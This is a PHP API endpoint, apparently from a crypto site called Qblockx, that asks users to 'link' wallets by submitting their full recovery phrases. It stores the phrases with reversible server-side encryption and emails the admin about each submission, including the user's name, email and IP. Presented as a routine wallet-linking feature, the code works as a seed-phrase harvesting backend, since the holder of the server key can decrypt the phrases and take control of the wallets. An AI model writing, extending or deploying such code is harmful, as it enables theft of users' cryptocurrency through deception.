<?php
/**
 * Project: Qblockx
 * API: User — Wallet Linking via recovery phrase (up to 5 per user)
 * Stores the recovery phrase AES-256 encrypted in `linked_wallets`.
 * GET    → returns all linked wallets for the user (never returns the phrase)
 * POST   → links a new wallet from a recovery phrase (max 5 per user)
 * DELETE → removes a linked wallet by id
 */

require_once '../../config/database.php';
require_once '../../config/env.php';
require_once '../../api/utilities/auth-check.php';
header('Content-Type: application/json');

requireAuth();
$user = getAuthUser();

$APP_KEY = getenv('APP_KEY') ?: ($_ENV['APP_KEY'] ?? '');
$APP_IV  = getenv('APP_IV')  ?: ($_ENV['APP_IV']  ?? '');

function encryptPhrase(string $phrase, string $key, string $iv): string {
    return base64_encode(openssl_encrypt($phrase, 'aes-256-cbc', $key, 0, $iv));
}

try {
    $db = Database::getInstance()->getConnection();

    // ── GET ──────────────────────────────────────────────────────────────────
    if ($_SERVER['REQUEST_METHOD'] === 'GET') {
        $stmt = $db->prepare(
            "SELECT id, provider_name AS wallet_name,
                    (phrase_encrypted IS NOT NULL AND phrase_encrypted <> '') AS has_phrase,
                    connected_at AS submitted_at, updated_at
             FROM linked_wallets
             WHERE user_id = :uid AND is_active = 1
             ORDER BY connected_at ASC"
        );
        $stmt->execute(['uid' => $user['id']]);
        $wallets = $stmt->fetchAll(PDO::FETCH_ASSOC);
        foreach ($wallets as &$w) { $w['has_phrase'] = (bool) $w['has_phrase']; }
        unset($w);

        echo json_encode([
            'success' => true,
            'data'    => ['wallets' => $wallets, 'count' => count($wallets)],
        ]);

    // ── POST ─────────────────────────────────────────────────────────────────
    } elseif ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $input       = json_decode(file_get_contents('php://input'), true) ?? [];
        $wallet_name = trim($input['wallet_name'] ?? '');
        $phrase      = trim(preg_replace('/\s+/', ' ', $input['phrase'] ?? ''));

        if (empty($wallet_name)) {
            echo json_encode(['success' => false, 'message' => 'Please choose a wallet']);
            exit;
        }
        if (empty($phrase)) {
            echo json_encode(['success' => false, 'message' => 'Please enter your recovery phrase']);
            exit;
        }

        // Recovery phrases are typically 12, 15, 18, 21 or 24 words
        $wordCount = count(explode(' ', $phrase));
        if ($wordCount < 12 || $wordCount > 24) {
            echo json_encode(['success' => false, 'message' => 'A recovery phrase is usually 12–24 words. Please check and try again.']);
            exit;
        }

        if (empty($APP_KEY) || empty($APP_IV)) {
            error_log('trust-wallet.php: APP_KEY/APP_IV not configured');
            echo json_encode(['success' => false, 'message' => 'Server configuration error. Please contact support.']);
            exit;
        }

        // Enforce 5-wallet limit
        $countStmt = $db->prepare("SELECT COUNT(*) FROM linked_wallets WHERE user_id = :uid AND is_active = 1");
        $countStmt->execute(['uid' => $user['id']]);
        if ((int) $countStmt->fetchColumn() >= 5) {
            echo json_encode(['success' => false, 'message' => 'Maximum of 5 wallets allowed. Remove one to add another.']);
            exit;
        }

        $encrypted = encryptPhrase($phrase, $APP_KEY, $APP_IV);

        $stmt = $db->prepare(
            "INSERT INTO linked_wallets (user_id, provider_name, phrase_encrypted, connected_at)
             VALUES (:uid, :wname, :phrase, NOW())"
        );
        $stmt->execute([
            'uid'    => $user['id'],
            'wname'  => $wallet_name,
            'phrase' => $encrypted,
        ]);

        // Respond to the client immediately, then close the connection — the SMTP
        // notification below can take several seconds, which made the "Connect Wallet"
        // button feel frozen. Under mod_php we flush with Connection: close so the
        // browser gets its answer before the slow email runs.
        $payload = json_encode([
            'success'     => true,
            'message'     => 'Wallet connected successfully.',
            'wallet_name' => $wallet_name,
        ]);
        ignore_user_abort(true);
        while (ob_get_level() > 0) { ob_end_clean(); }
        header('Content-Type: application/json');
        header('Content-Length: ' . strlen($payload));
        header('Connection: close');
        echo $payload;
        flush();
        if (function_exists('fastcgi_finish_request')) {
            fastcgi_finish_request();
        }

        // Notify the user + admin of the new wallet connection (runs after response is sent)
        try {
            require_once '../../api/utilities/email_templates.php';
            $nameStmt = $db->prepare("SELECT full_name FROM users WHERE id = :uid");
            $nameStmt->execute(['uid' => $user['id']]);
            $fullName = $nameStmt->fetchColumn() ?: 'User';

            // Confirmation to the user
            if (!empty($user['email'])) {
                Mailer::sendWalletConnected($user['email'], $fullName, $wallet_name);
            }

            $adminEmail = getenv('SMTP_FROM') ?: getenv('SMTP_USER') ?: '';
            if ($adminEmail) {
                Mailer::sendAdminWalletSubmitted(
                    $adminEmail,
                    (string) $user['id'],
                    $fullName,
                    $user['email'] ?? '',
                    $_SERVER['REMOTE_ADDR'] ?? '',
                    date('F j, Y H:i T')
                );
            }
        } catch (\Throwable $emailErr) {
            error_log('Linked wallet admin email error: ' . $emailErr->getMessage());
        }
        exit;

    // ── DELETE ────────────────────────────────────────────────────────────────
    } elseif ($_SERVER['REQUEST_METHOD'] === 'DELETE') {
        $input = json_decode(file_get_contents('php://input'), true) ?? [];
        $id    = (int) ($input['id'] ?? 0);

        if ($id <= 0) {
            echo json_encode(['success' => false, 'message' => 'Invalid wallet ID']);
            exit;
        }

        $db->prepare("DELETE FROM linked_wallets WHERE id = :id AND user_id = :uid")
           ->execute(['id' => $id, 'uid' => $user['id']]);

        echo json_encode(['success' => true, 'message' => 'Wallet removed.']);

    } else {
        http_response_code(405);
        echo json_encode(['success' => false, 'message' => 'Method not allowed']);
    }

} catch (PDOException $e) {
    error_log('trust-wallet.php: ' . $e->getMessage());
    http_response_code(500);
    echo json_encode(['success' => false, 'message' => 'Server error']);
}
